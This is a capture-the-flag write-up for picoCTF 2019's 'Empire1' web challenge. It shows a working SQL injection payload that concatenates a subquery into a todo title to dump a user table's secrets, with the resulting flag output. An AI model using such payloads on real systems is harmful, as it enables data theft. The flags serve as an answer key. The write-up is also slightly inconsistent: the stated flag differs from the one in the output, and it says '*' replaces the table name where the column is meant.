# Empire1 - 400 points
## Description

Psst, Agent 513, now that you're an employee of Evil Empire Co., try to get their secrets off the company website. `https://2019shell1.picoctf.com/problem/4155/` ([link](https://2019shell1.picoctf.com/problem/4155/)) Can you first find the secret code they assigned to you? or http://2019shell1.picoctf.com:4155

## Flag
```
picoCTF{wh00t_it_a_sql_inject29944a88}
```

## Solution

The SQL injection vulnerability through the Todo titles is fairly obvious. A simple `'` is enough to cause an SQL syntax error.

Our winning payload was:

```
' || (SELECT GROUP_CONCAT(secret) FROM user) || '
```

and the output was:

```
Very Urgent: Likes Oreos.,Know it all.,picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},...
```

Easy! The table name `user` was easy to guess and the column name `secret` was exfiltrated through other means / payloads. Technically you don't need to know the column name and can just use a `*` in place of the table name.

Note: Out of all of the `Empire\d` challenges, I have to say, this one was the easiest to solve.
